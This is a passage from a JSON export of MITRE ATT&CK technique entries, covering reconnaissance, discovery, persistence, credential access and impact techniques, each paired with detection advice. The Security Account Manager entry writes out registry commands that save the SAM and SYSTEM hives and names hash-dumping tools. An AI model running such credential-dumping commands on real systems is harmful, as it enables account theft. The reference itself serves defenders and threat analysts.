      "description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nCompromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.008",
      "stix_id": "attack-pattern--149b477f-f364-4824-b1b5-aa1d56115869",
      "created": "2024-03-28T03:29:35.616000+00:00",
      "modified": "2025-04-15T22:51:26.650000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1583.008": {
      "id": "T1583.008",
      "name": "Malvertising",
      "description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) ",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.008",
      "stix_id": "attack-pattern--155207c0-7f53-4f13-a06b-0a9907ef5096",
      "created": "2023-02-21T20:46:57.170000+00:00",
      "modified": "2025-04-15T22:47:29.928000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1069": {
      "id": "T1069",
      "name": "Permission Groups Discovery",
      "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1069",
      "stix_id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
      "created": "2017-05-31T21:30:55.471000+00:00",
      "modified": "2025-04-15T22:56:59.585000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Group: Group Metadata",
        "Command: Command Execution",
        "Application Log: Application Log Content",
        "Group: Group Enumeration"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Monitor container logs for commands and/or API calls related to listing permissions for pods and nodes, such as <code>kubectl auth can-i</code>.(Citation: K8s Authorization Overview)"
    },
    "T1114": {
      "id": "T1114",
      "name": "Email Collection",
      "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward email from mail servers or clients. ",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1114",
      "stix_id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
      "created": "2017-05-31T21:31:25.454000+00:00",
      "modified": "2025-04-15T22:26:37.477000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Application Log: Application Log Content",
        "Network Traffic: Network Connection Creation",
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nDetection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level."
    },
    "T1003.002": {
      "id": "T1003.002",
      "name": "Security Account Manager",
      "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.002",
      "stix_id": "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011",
      "created": "2020-02-11T18:42:07.281000+00:00",
      "modified": "2025-04-15T23:04:51.689000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Access",
        "Windows Registry: Windows Registry Key Access",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well."
    },
    "T1596.002": {
      "id": "T1596.002",
      "name": "WHOIS",
      "description": "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1596.002",
      "stix_id": "attack-pattern--166de1c6-2814-4fe5-8438-4e80f76b169f",
      "created": "2020-10-02T16:56:49.744000+00:00",
      "modified": "2025-04-15T23:20:02.082000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1542.001": {
      "id": "T1542.001",
      "name": "System Firmware",
      "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1542.001",
      "stix_id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
      "created": "2019-12-19T19:43:34.507000+00:00",
      "modified": "2025-04-15T19:58:09.046000+00:00",
      "platforms": [
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Firmware: Firmware Modification"
      ],
      "defense_bypassed": [],
      "detection": "System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.\n\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)"
    },
    "T1594": {
      "id": "T1594",
      "name": "Search Victim-Owned Websites",
      "description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).\n\nIn addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap XML 2023)(Citation: Register Robots TXT 2015) ",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1594",
      "stix_id": "attack-pattern--16cdd21f-da65-4e4f-bc04-dd7d198c7b26",
      "created": "2020-10-02T16:51:50.306000+00:00",
      "modified": "2025-04-15T23:04:36.505000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields."
    },
    "T1069.003": {
      "id": "T1069.003",
      "name": "Cloud Groups",
      "description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1069.003",
      "stix_id": "attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2",
      "created": "2020-02-21T21:15:33.222000+00:00",
      "modified": "2025-04-15T22:02:13.319000+00:00",
      "platforms": [
        "SaaS",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Application Log: Application Log Content",
        "Process: Process Creation",
        "Group: Group Metadata",
        "Group: Group Enumeration"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity."
    },
    "T1574.011": {
      "id": "T1574.011",
      "name": "Services Registry Permissions Weakness",
      "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.011",
      "stix_id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
      "created": "2020-03-13T11:42:14.444000+00:00",
      "modified": "2025-04-15T19:58:09.308000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Service: Service Modification",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data."
    },
    "T1596.001": {
      "id": "T1596.001",
      "name": "DNS/Passive DNS",
      "description": "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1596.001",
      "stix_id": "attack-pattern--17fd695c-b88c-455a-a3d1-43b6cb728532",
      "created": "2020-10-02T16:57:45.044000+00:00",
      "modified": "2025-04-15T22:14:34.882000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1499.003": {
      "id": "T1499.003",
      "name": "Application Exhaustion Flood",
      "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1499.003",
      "stix_id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
      "created": "2020-02-20T15:35:00.025000+00:00",
      "modified": "2025-04-15T21:48:39.804000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Sensor Health: Host Status",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt."
    },
    "T1195.001": {
      "id": "T1195.001",
      "name": "Compromise Software Dependencies and Development Tools",
      "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1195.001",
      "stix_id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
      "created": "2020-03-11T14:13:42.916000+00:00",
      "modified": "2025-04-15T22:08:13.223000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. "
    },
    "T1588.004": {
      "id": "T1588.004",
      "name": "Digital Certificates",
      "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588.004",
      "stix_id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
      "created": "2020-10-01T02:14:18.044000+00:00",
      "modified": "2025-04-15T22:18:17.702000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Certificate: Certificate Registration",
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)\n\nDetection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)."
    },
    "T1583.002": {
      "id": "T1583.002",
      "name": "DNS Server",
      "description": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.002",
      "stix_id": "attack-pattern--197ef1b9-e764-46c3-b96c-23f77985dc81",
      "created": "2020-10-01T00:40:45.279000+00:00",
      "modified": "2025-04-15T22:14:14.654000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1561": {
      "id": "T1561",
      "name": "Disk Wipe",
      "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1561",
      "stix_id": "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967",
      "created": "2020-02-20T22:02:20.372000+00:00",
      "modified": "2025-04-15T19:58:09.974000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Driver: Driver Load",
        "Drive: Drive Access",
        "Command: Command Execution",
        "Drive: Drive Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Look for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity."
    },
    "T1071.004": {
      "id": "T1071.004",
      "name": "DNS",
